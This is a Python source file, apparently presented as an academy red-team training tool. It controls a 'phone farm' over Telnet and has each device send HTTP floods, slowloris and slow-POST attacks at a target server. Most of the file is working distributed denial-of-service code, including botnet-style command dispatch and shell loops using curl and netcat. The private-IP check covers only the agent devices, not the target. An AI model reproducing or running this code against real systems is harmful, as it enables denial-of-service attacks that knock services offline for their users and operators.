"""
ZYLON FUSION v2.5 - Academy Battle Engine
Telnet-based agent controller for Red Team vs Blue Team exercises
Connects to YOUR phone farm on YOUR local network via existing Telnet setup
Sends controlled HTTP test commands, Ctrl+C stops ALL agents instantly

SCOPE: Private/local network ONLY (192.168.x.x, 10.x.x.x, 172.16-31.x.x)
Academy Use: Red Team attacks YOUR DVWA, Blue Team defends YOUR server
"""

import telnetlib
import socket
import threading
import time
import json
import random
from datetime import datetime

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box

console = Console()

# ============================================================================
# PRIVATE IP RANGE CHECK - Prevents use against non-local devices
# ============================================================================

def is_private_ip(ip):
    """Check if IP is in private/local range (RFC 1918)"""
    try:
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        octets = [int(p) for p in parts]
        # 10.0.0.0/8
        if octets[0] == 10:
            return True
        # 172.16.0.0/12
        if octets[0] == 172 and 16 <= octets[1] <= 31:
            return True
        # 192.168.0.0/16
        if octets[0] == 192 and octets[1] == 168:
            return True
        # localhost
        if octets[0] == 127:
            return True
    except (ValueError, IndexError):
        return False
    return False


# ============================================================================
# TELNET AGENT - Represents one phone in the farm
# ============================================================================

class TelnetAgent:
    """Represents a single phone agent connected via Telnet"""
    
    def __init__(self, host, port, username, password, agent_id=0):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.agent_id = agent_id
        self.connected = False
        self.tn = None
        self.os_type = None  # 'termux' or 'linux'
        self.busy = False
        self.requests_sent = 0
        self.last_status = "Disconnected"
    
    def connect(self, timeout=10):
        """Connect to agent via Telnet"""
        try:
            self.tn = telnetlib.Telnet(self.host, self.port, timeout=timeout)
            
            # Wait for login prompt
            self.tn.read_until(b"login: ", timeout=5)
            self.tn.write(self.username.encode() + b"\n")
            
            # Wait for password prompt
            self.tn.read_until(b"Password: ", timeout=5)
            self.tn.write(self.password.encode() + b"\n")
            
            # Wait for shell prompt
            response = self.tn.read_until(b"$ ", timeout=5)
            if b"$ " in response or b"# " in response:
                self.connected = True
                self.last_status = "Connected"
                
                # Detect OS
                self.tn.write(b"uname -a 2>/dev/null || echo TERMUX_ANDROID\n")
                resp = self.tn.read_until(b"$ ", timeout=5).decode('utf-8', errors='ignore')
                if "TERMUX" in resp or "android" in resp.lower():
                    self.os_type = "termux"
                else:
                    self.os_type = "linux"
                
                return True, "Connected"
            else:
                self.last_status = "Auth failed"
                return False, "Authentication failed"
                
        except socket.timeout:
            self.last_status = "Timeout"
            return False, "Connection timeout"
        except ConnectionRefusedError:
            self.last_status = "Refused"
            return False, "Connection refused"
        except Exception as e:
            self.last_status = f"Error: {str(e)[:30]}"
            return False, str(e)[:50]
    
    def execute(self, command, timeout=10):
        """Execute a command on the agent"""
        if not self.connected or not self.tn:
            return False, "Not connected"
        
        try:
            self.tn.write(command.encode() + b"\n")
            # Read until we get the prompt back
            response = self.tn.read_until(b"$ ", timeout=timeout)
            return True, response.decode('utf-8', errors='ignore')
        except Exception as e:
            self.last_status = f"Exec error: {str(e)[:20]}"
            return False, str(e)[:50]
    
    def send_stop(self):
        """Send stop signal (Ctrl+C) to the agent"""
        if not self.connected or not self.tn:
            return
        try:
            # Send Ctrl+C
            self.tn.write(b"\x03")
            time.sleep(0.2)
            self.tn.write(b"\x03")
            time.sleep(0.2)
            # Kill any remaining background processes
            self.tn.write(b"pkill -f 'curl.*zylon' 2>/dev/null; pkill -f 'wget.*zylon' 2>/dev/null\n")
            time.sleep(0.3)
            self.busy = False
            self.last_status = "Stopped"
        except Exception:
            pass
    
    def disconnect(self):
        """Disconnect from agent"""
        self.send_stop()
        try:
            if self.tn:
                self.tn.write(b"exit\n")
                self.tn.close()
        except Exception:
            pass
        self.connected = False
        self.last_status = "Disconnected"


# ============================================================================
# BATTLE MODE CONTROLLER
# ============================================================================

class BattleEngine:
    """
    Academy Battle Engine - Red Team vs Blue Team Controller
    
    Connects to YOUR phone farm on YOUR local network via Telnet
    Sends controlled HTTP test traffic to YOUR target server
    Ctrl+C emergency stop kills ALL agents instantly
    """
    
    def __init__(self):
        self.agents = []
        self.target = None
        self.running = False
        self._stop_flag = threading.Event()
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'blocked': 0,
            'errors': 0,
            'start_time': None,
            'agents_active': 0,
            'phases_run': 0
        }
    
    def add_agent(self, host, port, username, password):
        """Add a phone agent to the farm"""
        # Security: Only allow private/local network IPs
        if not is_private_ip(host):
            return False, f"BLOCKED: {host} is not a local/private IP. Battle Mode only works on YOUR local network."
        
        agent_id = len(self.agents) + 1
        agent = TelnetAgent(host, port, username, password, agent_id)
        self.agents.append(agent)
        return True, f"Agent {agent_id} added ({host}:{port})"
    
    def connect_all(self):
        """Connect to all registered agents"""
        if not self.agents:
            return False, "No agents registered"
        
        results = []
        connected = 0
        
        for agent in self.agents:
            success, msg = agent.connect(timeout=8)
            results.append((agent.agent_id, agent.host, success, msg))
            if success:
                connected += 1
        
        self.stats['agents_active'] = connected
        return connected > 0, results
    
    def disconnect_all(self):
        """Emergency disconnect from all agents"""
        self._stop_flag.set()
        self.running = False
        for agent in self.agents:
            agent.send_stop()
            agent.disconnect()
    
    def _build_curl_command(self, target_url, method="GET", path="/", 
                             threads=1, count=10, delay=0.1):
        """Build a curl-based test command for the agent"""
        # Generate unique test URL with random parameter
        test_url = f"{target_url}{path}?zylon={random.randint(10000,99999)}"
        
        if self.agents and self.agents[0].os_type == "termux":
            # Termux-compatible command using curl
            cmd = (
                f"for i in $(seq 1 {count}); do "
                f"curl -s -o /dev/null -w '%{{http_code}}' "
                f"-X {method} "
                f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
                f"-H 'X-Test-Request: $i' "
                f"'{target_url}{path}?zylon=$RANDOM' "
                f"2>/dev/null && echo ''; "
                f"sleep {delay}; "
                f"done"
            )
        else:
            # Linux-compatible with curl
            cmd = (
                f"for i in $(seq 1 {count}); do "
                f"curl -s -o /dev/null -w '%{{http_code}}\\n' "
                f"-X {method} "
                f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
                f"-H 'X-Test-Request: $i' "
                f"'{target_url}{path}?zylon=$RANDOM' "
                f"2>/dev/null; "
                f"sleep {delay}; "
                f"done"
            )
        return cmd
    
    def _build_flood_command(self, target_url, count=50, path="/"):
        """Build a rapid-fire test command (more aggressive for battle mode)"""
        if self.agents and self.agents[0].os_type == "termux":
            cmd = (
                f"for i in $(seq 1 {count}); do "
                f"curl -s -o /dev/null -w '%{{http_code}} ' "
                f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
                f"'{target_url}{path}?q=$RANDOM' "
                f"--max-time 5 2>/dev/null; "
                f"done; echo ''"
            )
        else:
            cmd = (
                f"for i in $(seq 1 {count}); do "
                f"curl -s -o /dev/null -w '%{{http_code}} ' "
                f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
                f"'{target_url}{path}?q=$RANDOM' "
                f"--max-time 5 2>/dev/null; "
                f"done; echo ''"
            )
        return cmd
    
    def _build_slowloris_command(self, target_host, target_port=80, count=5):
        """Build a slowloris-style test using bash netcat (if available)"""
        cmd = (
            f"for i in $(seq 1 {count}); do "
            f"(echo -ne 'GET /slowloris-test-{random.randint(1000,9999)} HTTP/1.1\\r\\n"
            f"Host: {target_host}\\r\\n"
            f"User-Agent: ZYLONAcademy-RedTeam\\r\\n"
            f"X-Keep-{random.randint(1000,9999)}: alive\\r\\n'; "
            f"sleep 3; "
            f"echo -ne 'X-Keep-{random.randint(1000,9999)}: alive\\r\\n'; "
            f"sleep 3; "
            f"echo -ne 'X-Keep-{random.randint(1000,9999)}: alive\\r\\n'; "
            f"sleep 2) | nc -w 15 {target_host} {target_port} 2>/dev/null & "
            f"done; "
            f"wait; echo 'DONE'"
        )
        return cmd
    
    def _run_agent_command(self, agent, command, result_list, lock):
        """Run a command on an agent and collect results"""
        agent.busy = True
        agent.last_status = "Attacking"
        success, response = agent.execute(command, timeout=120)
        
        with lock:
            result_list.append({
                'agent_id': agent.agent_id,
                'host': agent.host,
                'success': success,
                'response': response[:500] if response else "",
            })
            
            if success:
                # Parse status codes from response
                codes_found = []
                for word in response.split():
                    word = word.strip()
                    if word.isdigit() and len(word) == 3:
                        codes_found.append(int(word))
                
                self.stats['total_requests'] += len(codes_found)
                for code in codes_found:
                    if 200 <= code < 400:
                        self.stats['successful'] += 1
                    elif code in [429, 503, 403, 508]:
                        self.stats['blocked'] += 1
                    else:
                        self.stats['errors'] += 1
            
            agent.busy = False
            agent.last_status = "Idle"
    
    # ========================================================================
    # BATTLE PHASES
    # ========================================================================
    
    def phase_recon(self, target_url):
        """Phase 1: Recon - Each agent sends 5 light requests"""
        self._stop_flag.clear()
        self.stats['phases_run'] += 1
        
        console.print(f"\n[bold cyan][PHASE 1] Reconnaissance - Light probing[/bold cyan]")
        console.print(f"[dim]   Each agent sends 5 gentle requests to map target[/dim]")
        
        results = []
        lock = threading.Lock()
        threads = []
        
        for agent in self.agents:
            if not agent.connected or self._stop_flag.is_set():
                continue
            cmd = self._build_curl_command(target_url, count=5, delay=0.5)
            t = threading.Thread(target=self._run_agent_command, 
                               args=(agent, cmd, results, lock), daemon=True)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=60)
        
        # Display results
        for r in results:
            status = "✅" if r['success'] else "❌"
            console.print(f"  [{status}] Agent {r['agent_id']} ({r['host']}): "
                         f"{len([w for w in r['response'].split() if w.isdigit() and len(w)==3])} responses")
        
        return results
    
    def phase_flood(self, target_url, requests_per_agent=50, path="/"):
        """Phase 2: Flood - Rapid fire HTTP requests from all agents"""
        self._stop_flag.clear()
        self.stats['phases_run'] += 1
        
        agent_count = sum(1 for a in self.agents if a.connected)
        total_requests = agent_count * requests_per_agent
        
        console.print(f"\n[bold red][PHASE 2] HTTP Flood - {agent_count} agents × {requests_per_agent} requests[/bold red]")
        console.print(f"[dim]   Total: ~{total_requests} requests | Ctrl+C = EMERGENCY STOP[/dim]")
        
        results = []
        lock = threading.Lock()
        threads = []
        self.running = True
        
        for agent in self.agents:
            if not agent.connected or self._stop_flag.is_set():
                continue
            cmd = self._build_flood_command(target_url, count=requests_per_agent, path=path)
            t = threading.Thread(target=self._run_agent_command,
                               args=(agent, cmd, results, lock), daemon=True)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=180)
        
        self.running = False
        
        # Summary
        blocked = self.stats['blocked']
        total = self.stats['total_requests']
        if total > 0:
            block_rate = (blocked / total) * 100
            if block_rate > 10:
                console.print(f"\n  [green]🛡️ Blue Team Defense: {block_rate:.0f}% requests blocked![/green]")
            else:
                console.print(f"\n  [red]⚡ Red Team Success: Only {block_rate:.0f}% blocked - target vulnerable![/red]")
        
        return results
    
    def phase_slowloris(self, target_host, target_port=80, connections_per_agent=3):
        """Phase 3: Slowloris - Slow connection test from all agents"""
        self._stop_flag.clear()
        self.stats['phases_run'] += 1
        
        console.print(f"\n[bold yellow][PHASE 3] Slowloris - Slow connection exhaustion[/bold yellow]")
        console.print(f"[dim]   Each agent opens {connections_per_agent} slow connections[/dim]")
        
        results = []
        lock = threading.Lock()
        threads = []
        
        for agent in self.agents:
            if not agent.connected or self._stop_flag.is_set():
                continue
            cmd = self._build_slowloris_command(target_host, target_port, 
                                                 count=connections_per_agent)
            t = threading.Thread(target=self._run_agent_command,
                               args=(agent, cmd, results, lock), daemon=True)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=60)
        
        return results
    
    def phase_slow_post(self, target_url, connections_per_agent=2):
        """Phase 4: Slow POST - Slow body upload from all agents"""
        self._stop_flag.clear()
        self.stats['phases_run'] += 1
        
        console.print(f"\n[bold magenta][PHASE 4] Slow POST - Slow body upload[/bold magenta]")
        
        results = []
        lock = threading.Lock()
        threads = []
        
        for agent in self.agents:
            if not agent.connected or self._stop_flag.is_set():
                continue
            
            if agent.os_type == "termux":
                cmd = (
                    f"for i in $(seq 1 {connections_per_agent}); do "
                    f"(echo -ne 'POST /slowpost-test HTTP/1.1\\r\\n"
                    f"Host: {target_url.split('//')[1].split('/')[0] if '//' in target_url else target_url}\\r\\n"
                    f"Content-Type: application/x-www-form-urlencoded\\r\\n"
                    f"Content-Length: 65536\\r\\n"
                    f"Connection: keep-alive\\r\\n\\r\\n'; "
                    f"for j in $(seq 1 100); do "
                    f"echo -ne 'A=AAAAAAAAAAAAAAAA'; sleep 0.5; "
                    f"done) | nc -w 30 {target_url.split('//')[1].split('/')[0] if '//' in target_url else target_url} 80 2>/dev/null & "
                    f"done; wait; echo 'DONE'"
                )
            else:
                cmd = (
                    f"for i in $(seq 1 {connections_per_agent}); do "
                    f"curl -s -X POST '{target_url}/slowpost-test' "
                    f"-H 'Content-Type: application/x-www-form-urlencoded' "
                    f"-H 'Transfer-Encoding: chunked' "
                    f"--limit-rate 16 -d 'A=AAAA' "
                    f"--max-time 30 2>/dev/null; "
                    f"done; echo 'DONE'"
                )
            
            t = threading.Thread(target=self._run_agent_command,
                               args=(agent, cmd, results, lock), daemon=True)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=60)
        
        return results
    
    def get_agent_status(self):
        """Get status of all agents"""
        status_list = []
        for agent in self.agents:
            status_list.append({
                'id': agent.agent_id,
                'host': agent.host,
                'port': agent.port,
                'connected': agent.connected,
                'os_type': agent.os_type,
                'busy': agent.busy,
                'status': agent.last_status,
                'requests_sent': agent.requests_sent
            })
        return status_list
    
    def get_stats(self):
        """Get battle statistics"""
        elapsed = 0
        if self.stats['start_time']:
            elapsed = round(time.time() - self.stats['start_time'], 1)
        
        return {
            **self.stats,
            'elapsed_seconds': elapsed,
            'requests_per_second': round(self.stats['total_requests'] / max(elapsed, 1), 1),
            'agents_total': len(self.agents),
            'agents_active': sum(1 for a in self.agents if a.connected)
        }
    
    def display_dashboard(self):
        """Display live battle dashboard"""
        stats = self.get_stats()
        
        # Agent table
        agent_table = Table(
            title="[bold red]Agent Status[/bold red]",
            box=box.ROUNDED, border_style="red"
        )
        agent_table.add_column("ID", style="yellow", width=4)
        agent_table.add_column("Host", style="cyan", width=18)
        agent_table.add_column("OS", style="green", width=8)
        agent_table.add_column("Connected", style="green", width=10)
        agent_table.add_column("Status", style="white", width=15)
        
        for agent in self.agents:
            conn = "✅" if agent.connected else "❌"
            agent_table.add_row(
                str(agent.agent_id),
                f"{agent.host}:{agent.port}",
                agent.os_type or "?",
                conn,
                agent.last_status
            )
        
        console.print(agent_table)
        
        # Stats panel
        console.print(Panel(
            f"[bold]Battle Statistics[/bold]\n\n"
            f"  Agents Active: [green]{stats['agents_active']}/{stats['agents_total']}[/green]\n"
            f"  Total Requests: [cyan]{stats['total_requests']}[/cyan]\n"
            f"  Successful: [green]{stats['successful']}[/green] | "
            f"Blocked: [red]{stats['blocked']}[/red] | "
            f"Errors: [yellow]{stats['errors']}[/yellow]\n"
            f"  Requests/sec: [bold]{stats['requests_per_second']}[/bold]\n"
            f"  Phases Run: {stats['phases_run']}\n"
            f"  Elapsed: {stats['elapsed_seconds']}s",
            title="[bold red]⚔️ Battle Dashboard[/bold red]",
            border_style="red",
            box=box.HEAVY
        ))
